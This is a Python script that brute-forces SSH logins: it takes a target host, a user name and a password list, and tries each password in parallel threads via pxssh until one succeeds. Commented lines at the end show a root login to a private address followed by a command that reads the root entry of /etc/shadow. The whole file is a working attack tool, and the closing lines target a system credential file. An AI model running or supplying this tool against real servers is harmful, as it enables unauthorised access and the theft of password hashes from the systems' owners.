#!/usr/bin/env python3
# coding=utf-8
__author__="riverchu"

import sys
sys.path.append('../')

import optparse
import time
from pexpect import pxssh
from threading import *

MAX_CONNECTION = 100
CONNECTION_LOCK = BoundedSemaphore(value=MAX_CONNECTION)

Found = False
Fails = 0


def send_command(s, cmd):
    s.sendline(cmd)
    s.prompt()
    print(str(s.before,encoding="utf8"))

def connect(host,user,passwd,release):
    global Found
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host,user,passwd)
        print('[+] Password Found: '+passwd)
        Found=True
    except Exception as e:
        if 'read_nonblocking' in  str(e):
            Fails+=1
            time.sleep(5)
            connect(host,user,passwd,False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host,user,passwd,False)
    finally:
        if release:CONNECTION_LOCK.release()

def bruteSSH():
    parser = optparse.OptionParser('usage %prog '+'-H <target host> -u <user> -F <password list>')
    parser.add_option('-H',dest = 'tgtHost',type='string',help='specify target host')
    parser.add_option('-F',dest = 'passwdFile',type='string',help='specify password file')
    parser.add_option('-u',dest = 'user',type='string',help='specify the user')
    (options,args)=parser.parse_args()
    host = options.tgtHost
    passwdFile = options.passwdFile
    user = options.user

    if host==None or passwdFile==None or user==None:
        print(parser.usage)
        exit(0)

    global Found
    global Fails
    threads = []
    fn = open(passwdFile,'r')
    for line in fn.readlines():
        if Found:
            print("[+] Exiting: Password Found")
            exit(0)
        if Fails>5:
            print('[-] Exiting: Too Many Socket Timeouts')
            exit(0)
        CONNECTION_LOCK.acquire()
        passwd = line.strip('\r').strip('\n')
        print('[+] Testing: '+str(passwd))
        t = Thread(target=connect, args=(host,user,passwd,True))
        t.setDaemon(True)
        threads.append(t)
        t.start()
    if not Found:
        for t in threads:
            t.join()

if __name__=="__main__":
    bruteSSH()
#s=connect('10.108.36.71','root','indigosrpi')
#send_command(s,'cat /etc/shadow | grep root')
